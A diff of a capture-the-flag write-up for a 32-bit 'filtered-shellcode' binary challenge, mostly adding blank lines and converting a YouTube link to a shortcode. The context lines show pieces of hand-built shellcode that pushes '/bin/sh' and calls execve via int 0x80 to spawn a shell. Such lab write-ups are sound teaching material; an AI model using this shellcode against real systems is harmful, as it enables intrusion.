@@ -24,6 +24,7 @@ We get a `32` bit `ELF`.
 file fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped
 ```
 
+
 The title of the challenge is `filtered-shellcode` so I'm pretty sure `NX` isn't enabled. 
 
 
@@ -46,6 +47,7 @@ The Ghidra decompilation was a bit easier to read than IDA's decompilation.
 
 
 The decompilation was really hard to read it even looked harder than `x86-64`.
+
 
 ```C
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
@@ -185,11 +187,13 @@ We need to find the instructions that are not `2` byte instructions.
 
 I found `5` instructions. 
 
+
 ```asm
 2:  50  push   eax
 f:  50  push   eax
 10: 53  push   ebx
 ```
+
 
 ```asm
 3:  68 2f 2f 73 68          push   0x68732f2f
@@ -211,6 +215,7 @@ f:  50  push   eax
 10: 53  push   ebx
 0:  90  nop
 ```
+
 
 Passing `/bin/sh` is the hard part. 
 
@@ -279,6 +284,7 @@ push ebx
 nop
 ```
 
+
 We'll need to do the same thing for the rest of the characters `'s'`, `'/'`, `'n'`, `'i'`, `'b'`, `'/'`. 
 
 
@@ -297,6 +303,7 @@ mov bl, 0x2f
 push ebx 
 nop
 ```
+
 
 Do the same thing for `'n'`, `'i'`, `'b'`, `'/'`.
 
@@ -317,12 +324,15 @@ mov ebx, esp
 
 Pass the syscall number for execve `(11)` and run the instruction with `int 0x80`.
 
+
 ```
 mov al, 0xb
 int 0x80 
 ```
 
+
 Here's the full shellcode.
+
 
 ```python
 shellcode=asm(f'''
@@ -470,7 +480,8 @@ int main(int argc, char *argv[]) {
 Thanks to Professor Martin Carlisle and bernie6401 for their writeup. 
 
 
-https://www.youtube.com/watch?v=_yW5QTVFGl8
+{{< youtube _yW5QTVFGl8 >}}
+
 
 https://hackmd.io/@SBK6401/HJ0Yn79ih 
 
